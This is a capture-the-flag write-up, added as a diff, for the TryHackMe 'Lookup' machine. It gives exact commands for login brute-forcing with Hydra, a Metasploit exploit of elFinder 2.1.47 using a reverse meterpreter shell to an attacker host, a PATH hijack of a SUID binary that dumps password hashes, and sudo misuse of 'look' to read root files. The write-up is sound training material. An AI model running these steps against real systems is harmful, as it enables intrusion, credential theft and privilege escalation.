@@ -1,0 +1,233 @@
+LOOKUP.THM CTF WRITEUP
+=======================
+
+TARGET INFORMATION
+------------------
+IP Address: 10.49.172.146
+Domain: lookup.thm
+Additional VHost: files.lookup.thm
+
+--------------------------------------------------------------------------------
+1. RECONNAISSANCE
+--------------------------------------------------------------------------------
+
+Nmap Scan:
+----------
+Command: nmap -sV -sC -p- 10.49.172.146 -oN nmap_scan.txt
+
+Results:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
+| ssh-hostkey:
+|   3072 c0:78:1f:aa:f0:8c:11:19:56:28:b6:45:e3:05:9f:4b (RSA)
+|   256 c8:4d:8c:23:97:82:ca:e8:0f:7b:da:c5:0c:95:56:ba (ECDSA)
+|_  256 2f:4e:3a:db:b6:bb:c0:c6:72:6d:32:88:44:1f:95:a0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 (Ubuntu)
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Login Page
+
+The scan revealed two open ports:
+- Port 22: SSH service
+- Port 80: HTTP web server with a login page
+
+Web Enumeration:
+----------------
+Visiting http://lookup.thm presented a login page. Testing revealed different error
+messages based on username validity:
+- Non-existent username → "Invalid username"
+- Existing username → "Wrong password"
+
+This behavior indicated username enumeration was possible due to differential error
+responses.
+
+Directory Brute-forcing:
+------------------------
+Command: gobuster dir -u http://lookup.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt
+
+Results:
+/server-status          (Status: 403)
+
+Only a 403 Forbidden endpoint was found, confirming the login page was the primary
+attack vector.
+
+--------------------------------------------------------------------------------
+2. INITIAL ACCESS
+--------------------------------------------------------------------------------
+
+Username Enumeration:
+---------------------
+Using the differential error messages, I manually tested common usernames. The
+username "jose" returned "Wrong password," confirming it existed while others
+returned "Invalid username."
+
+Password Brute-forcing:
+----------------------
+With the valid username "jose," I performed a password attack using Hydra:
+
+Command: hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -t 64
+
+Result: Password found: password123
+Credentials obtained: jose:password123
+
+Login and VHost Discovery:
+--------------------------
+After logging in with the credentials, the application redirected to
+"files.lookup.thm" which didn't resolve initially. This indicated a virtual host
+that needed to be added to the hosts file:
+
+Command: echo "10.49.172.146 files.lookup.thm" | sudo tee -a /etc/hosts
+
+After adding the entry, accessing files.lookup.thm revealed the authenticated
+application.
+
+--------------------------------------------------------------------------------
+3. EXPLOITATION - ELFINDER
+--------------------------------------------------------------------------------
+
+The authenticated area revealed an elFinder installation (web file manager).
+Checking the "About" section showed version 2.1.47.
+
+Vulnerability Research:
+----------------------
+Command: searchsploit elfinder 2.1.47
+
+Found: elFinder 2.1.47 - PHP File Upload Remote Code Execution (CVE-2019-9194)
+This vulnerability allows authenticated users to execute arbitrary commands.
+
+Metasploit Exploitation:
+------------------------
+I used Metasploit to exploit the vulnerability:
+
+msfconsole
+search elfinder
+use exploit/unix/webapp/elfinder_php_connector_exftran_cmd_inject
+set RHOSTS files.lookup.thm
+set TARGETURI /elfinder/elfinder-2.1.47/
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST <attacker-ip>
+run
+
+After gaining a Meterpreter shell, I upgraded to a stable Python shell for better
+interactivity:
+
+Command: python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+This provided a more functional shell environment for further enumeration.
+
+--------------------------------------------------------------------------------
+4. PRIVILEGE ESCALATION
+--------------------------------------------------------------------------------
+
+SUID Enumeration:
+-----------------
+I searched for SUID binaries that could be exploited for privilege escalation:
+
+Command: find / -user root -perm /4000 2>/dev/null
+
+Interesting finding:
+/usr/sbin/pwm
+
+This was a custom SUID binary not present in standard Ubuntu installations,
+making it a prime target for investigation.
+
+Analyzing the pwm Binary:
+-------------------------
+The binary appeared to read files and display password hashes when executed.
+To understand its behavior, I ran it and observed it was calling the "id" command.
+
+To exploit this, I manipulated the PATH environment variable to hijack the "id"
+command:
+
+Commands:
+echo -e '#!/bin/bash\necho "uid=1000(think) gid=1000(think) groups=1000(think)"' > /tmp/id
+chmod +x /tmp/id
+export PATH=/tmp:$PATH
+/usr/sbin/pwm
+
+The binary executed "id" from /tmp instead of /usr/bin/id, causing it to output
+fake user data and then dump password hashes from system files.
+
+Password Cracking:
+------------------
+I saved the leaked password hashes to a file for cracking:
+
+Command: cat > passwords.txt
+(Pasted the hashes from pwm output)
+
+Using hash identification and cracking tools, one hash was successfully cracked:
+
+Username: think
+Password: josemario.AKA(think)
+
+SSH Access:
+-----------
+With these credentials, I could access the system via SSH:
+
+Command: ssh think@lookup.thm
+Password: josemario.AKA(think)
+
+This provided a more stable and fully-featured shell.
+
+--------------------------------------------------------------------------------
+5. ROOT FLAG RETRIEVAL
+--------------------------------------------------------------------------------
+
+Checking Sudo Privileges:
+-------------------------
+Command: sudo -l
+
+Output:
+User think may run the following commands on lookup:
+    (ALL) /usr/bin/look
+
+The "look" command displays lines beginning with a given prefix from files. This
+sudo permission could be exploited to read any file.
+
+Exploiting the look Command:
+----------------------------
+Research showed that using an empty prefix string with look displays all lines
+from a file. With sudo privileges, this allowed reading the root flag:
+
+Command: sudo look '' /root/root.txt
+
+This displayed the entire contents of root.txt, revealing the final flag.
+
+Flag obtained: THM{...}
+
+--------------------------------------------------------------------------------
+TOOLS USED
+--------------------------------------------------------------------------------
+
+1. Nmap - Port scanning and service enumeration
+2. Gobuster - Directory enumeration
+3. Hydra - Password brute-forcing
+4. Metasploit - elFinder exploitation
+5. Custom PATH manipulation - SUID binary exploitation
+6. SSH - Remote access
+
+--------------------------------------------------------------------------------
+KEY LEARNINGS
+--------------------------------------------------------------------------------
+
+1. Always check for differential error messages in login forms - they can reveal
+   valid usernames and simplify brute-forcing.
+
+2. Virtual hosts (VHosts) can hide additional attack surfaces - always add
+   discovered domains to /etc/hosts.
+
+3. Version disclosure in web applications is critical - always check "About"
+   sections for vulnerable versions.
+
+4. SUID binaries with PATH vulnerabilities can lead to privilege escalation -
+   always analyze custom SUID binaries.
+
+5. The "look" command with sudo can read arbitrary files when used with an empty
+   prefix - check sudo permissions carefully.
+
+6. Always upgrade to a stable shell after initial exploitation for better
+   enumeration capabilities.
+
+--------------------------------------------------------------------------------
+*This writeup is for educational purposes only. Always obtain proper authorization
+before testing systems.*
+--------------------------------------------------------------------------------
